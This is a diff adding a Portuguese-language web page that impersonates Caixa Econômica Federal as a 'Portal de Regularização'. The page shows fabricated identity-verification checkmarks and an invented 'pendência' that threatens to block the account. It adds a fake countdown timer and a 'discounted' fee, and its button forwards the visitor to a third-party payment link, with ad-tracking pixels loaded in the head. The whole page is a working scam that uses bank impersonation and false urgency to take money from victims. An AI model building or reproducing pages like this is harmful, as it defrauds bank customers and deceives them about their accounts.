@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="utf-8">
+    <script>
+        window.pixelId = "67ef67b0655738af4b8dbdd8";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <!-- Meta Pixel Code -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '2853456888176959');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=2853456888176959&ev=PageView&noscript=1" /></noscript>
+    <!-- End Meta Pixel Code -->
+    <script src="https://otimizey-cdn.s3.us-east-1.amazonaws.com/scripts-utm-otimizey.js" async defer></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caixa Econômica Federal - Portal de Regularização</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids data-utmify-ignore-iframe
+        async defer></script>
+    <script>
+        window.pixelId = "68312b2ad323906a4dbab27f";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'primary': '#005CA9', // Cor primária Caixa
+                        'secondary': '#F39200', // Laranja Caixa
+                        'dark': '#333333', // Cor escura para textos
+                        'light': '#FFFFFF' // Cor clara para fundos
+                    },
+                    fontFamily: {
+                        'sans': ['Montserrat', 'Arial', 'Helvetica', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        @font-face {
+            font-family: 'FuturaBold';
+            src: url('../fonts/futuraBold.eot');
+            src: url('../fonts/futuraBold.eot#iefix') format('embedded-opentype'),
+                url('../fonts/futuraBold.woff') format('woff'),
+                url('../fonts/futuraBold.ttf') format('truetype'),
+                url('../fonts/futuraBold.svg#futuraBold') format('svg');
+            font-weight: bold;
+            font-style: normal;
+        }
+
+        :root {
+            --blue-10: #005CA9;
+            --blue-20: #005CA9;
+            --blue-30: #005CA9;
+            --orange-10: #F39200;
+            --gray-10: #F8F9FA;
+            --gray-20: #ECEEF1;
+        }
+
+        body {
+            font-family: 'Montserrat', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: var(--gray-10);
+            min-width: 320px;
+        }
+
+        .barra-governo {
+            background: var(--blue-10);
+            height: 5px;
+            background: linear-gradient(to right, #005CA9 70%, #F39200 30%);
+            width: 100%;
+        }
+
+        .header-top {
+            background: white;
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .header-logo img {
+            height: 40px;
+        }
+
+        .header-logo span {
+            color: var(--blue-10);
+            font-size: 24px;
+            font-weight: 600;
+            border-left: 1px solid rgba(0, 0, 0, 0.1);
+            padding-left: 16px;
+            font-family: 'FuturaBold', 'Montserrat', Arial, sans-serif;
+        }
+
+        .breadcrumb {
+            background: white;
+            padding: 16px 24px;
+            border-bottom: 1px solid var(--gray-20);
+            color: var(--blue-20);
+            font-size: 14px;
+        }
+
+        .breadcrumb i {
+            font-size: 12px;
+            margin: 0 8px;
+        }
+
+        .main-container {
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 40px 24px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 4px;
+            border: 1px solid var(--gray-20);
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+
+        .card-title {
+            color: var(--blue-10);
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            font-family: 'FuturaBold', 'Montserrat', Arial, sans-serif;
+        }
+
+        .alert {
+            background: #FFF3CD;
+            border: 1px solid #FFEEBA;
+            border-radius: 4px;
+            padding: 16px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .alert i {
+            color: #856404;
+            font-size: 20px;
+        }
+
+        .alert p {
+            color: #856404;
+            font-weight: 500;
+            margin: 0;
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--gray-20);
+        }
+
+        .status-item:last-child {
+            border-bottom: none;
+        }
+
+        .status-item i {
+            font-size: 20px;
+        }
+
+        .status-item.success i {
+            color: #168821;
+        }
+
+        .status-item.warning i {
+            color: #DC3545;
+        }
+
+        .price-box {
+            background: #E9F8FF;
+            border: 1px solid #BEE5EB;
+            border-radius: 4px;
+            padding: 24px;
+            text-align: center;
+            margin: 24px 0;
+        }
+
+        .price-old {
+            color: #6C757D;
+            text-decoration: line-through;
+            font-size: 16px;
+        }
+
+        .price-new {
+            color: var(--blue-20);
+            font-size: 32px;
+            font-weight: 700;
+            margin: 8px 0;
+            font-family: 'FuturaBold', 'Montserrat', Arial, sans-serif;
+        }
+
+        .price-info {
+            color: #6C757D;
+            font-size: 14px;
+        }
+
+        .btn-primary {
+            background: var(--blue-20);
+            color: white;
+            border: none;
+            border-radius: 24px;
+            padding: 16px 32px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-primary:hover {
+            background: #004a87;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            margin-top: 32px;
+            color: #6C757D;
+        }
+
+        .security-badges i {
+            margin-right: 8px;
+        }
+
+        .shake {
+            animation: shake 0.5s infinite;
+        }
+
+        @keyframes shake {
+            0% {
+                transform: translateX(0);
+            }
+
+            25% {
+                transform: translateX(-2px);
+            }
+
+            75% {
+                transform: translateX(2px);
+            }
+
+            100% {
+                transform: translateX(0);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-top {
+                padding: 16px;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 12px;
+            }
+
+            .header-logo span {
+                font-size: 18px;
+            }
+
+            .main-container {
+                padding: 20px 16px;
+            }
+
+            .card {
+                padding: 16px;
+            }
+
+            .security-badges {
+                flex-direction: column;
+                gap: 16px;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="barra-governo"></div>
+    <header class="header-top">
+        <div class="header-logo">
+            <img src="images/logo.png" alt="Logo Caixa">
+            <span>Portal de Regularização</span>
+        </div>
+    </header>
+
+    <div class="breadcrumb">
+        <span>Início</span>
+        <i class="fas fa-chevron-right"></i>
+        <span>Serviços</span>
+        <i class="fas fa-chevron-right"></i>
+        <span>Regularização</span>
+    </div>
+
+    <div class="main-container">
+        <div class="card">
+            <h2 class="card-title">Processamento de Regularização</h2>
+
+            <div class="alert">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>Atenção! O limite para processamento da regularização expira em <b>23 minutos e 42 segundos</b>.</p>
+            </div>
+
+            <div class="status-item success">
+                <i class="fas fa-check-circle"></i>
+                <div>
+                    <h3>CPF verificado</h3>
+                    <p>Seus dados foram verificados com sucesso.</p>
+                </div>
+            </div>
+
+            <div class="status-item success">
+                <i class="fas fa-check-circle"></i>
+                <div>
+                    <h3>Autenticação concluída</h3>
+                    <p>Sua identidade foi confirmada com êxito.</p>
+                </div>
+            </div>
+
+            <div class="status-item warning">
+                <i class="fas fa-exclamation-circle"></i>
+                <div>
+                    <h3>Pendência identificada</h3>
+                    <p>Foi identificada uma pendência que requer regularização para evitar bloqueio.</p>
+                </div>
+            </div>
+
+            <div class="price-box">
+                <div class="price-old">Valor normal: R$ 197,90</div>
+                <div class="price-new">R$ 23,70</div>
+                <div class="price-info">Oferta por tempo limitado - 90% de desconto</div>
+            </div>
+
+            <button onclick="checkout(event)" class="btn-primary">
+                <i class="fas fa-lock"></i> REGULARIZAR AGORA
+            </button>
+
+            <div style="text-align: center; margin-top: 16px; color: #6C757D; font-size: 14px;">
+                <i class="fas fa-clock"></i> Oferta válida por tempo limitado
+            </div>
+        </div>
+
+        <div class="security-badges">
+            <span><i class="fas fa-lock"></i> Pagamento Seguro</span>
+            <span><i class="fas fa-shield-alt"></i> Dados Protegidos</span>
+
+        </div>
+
+    </div>
+    </main>
+
+    <script>
+        function checkout(event) {
+            event.preventDefault();
+
+            // Pega os parâmetros UTM da URL atual
+            const urlParams = new URLSearchParams(window.location.search);
+            const utmParams = {};
+
+            // Mantém apenas os parâmetros UTM e outros relevantes
+            for (const [key, value] of urlParams.entries()) {
+                if (key.startsWith('utm_') || ['src', 'sck', 'xcod', 'fbclid', 'gclid', 'ttclid'].includes(key)) {
+                    utmParams[key] = value;
+                }
+            }
+
+            // Adiciona os novos parâmetros
+            utmParams.from_upsell = '3';
+            utmParams.valor = '1790';
+
+            // Mantém o parâmetro transaction se existir
+            if (urlParams.has('transaction')) {
+                utmParams.transaction = urlParams.get('transaction');
+            }
+
+            // Constrói a nova URL
+            const newParams = new URLSearchParams(utmParams);
+            var currentUrlParams = window.location.search;
+            window.location.href = "https://go.zeroonepay.com.br/bneccck7b3" + currentUrlParams;
+        }
+    </script>
+
+
+</body>
+
+</html>
